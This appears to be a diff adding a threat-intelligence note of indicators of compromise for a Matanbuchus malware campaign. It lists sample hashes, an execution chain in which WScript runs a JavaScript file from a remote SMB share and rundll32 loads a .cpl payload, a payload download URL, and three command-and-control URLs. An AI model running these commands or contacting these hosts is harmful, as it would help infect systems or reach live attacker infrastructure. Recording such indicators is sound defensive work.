@@ -1,0 +1,39 @@
+07.03.2024 | Matanbuchus |
+
+******************************
+
+.xls 1f152aca7ccc6b207e111bd8dcae7986b0678bf2a18aa827b521ca9d68dea931
+.js c66e705f800b30f591505be1c429c2e01b7851eb60bda14767d9d871151822e5
+.dll 1ca1315f03f4d1bca5867ad1c7a661033c49bbb16c4b84bea72caa9bc36bd98b
+
+******************************
+
+Exec >> .xls .js > .dll
+
+EXCEL.EXE" "C:\Users\Admin\AppData\Local\Temp\AC-7-march_2024#2849.xlsx
+
+WScript.exe \\5.252.177.213\share\Open_Document.PDF.js
+
+control.exe C:\Users\Admin\AppData\Local\Temp\50.cpl
+
+rundll32.exe Shell32.dll,Control_RunDLL C:\Users\Admin\AppData\Local\Temp\50.cpl
+
+rundll32.exe C:\Windows\SysWOW64\shell32.dll,#44 C:\Users\Admin\AppData\Local\Temp\50.cpl
+
+*************************************************
+
+smb .js
+
+file://5.252.177.213/share/Open_Document.PDF.js
+
+.dll
+
+https://988skins.com/admin/view/stylesheet/50k.png
+
+*************************************************
+
+c2's
+
+https://selevkis.app/useraccount.aspx
+https://muagol.com/useraccount.aspx
+https://gulappa.app/index.aspx
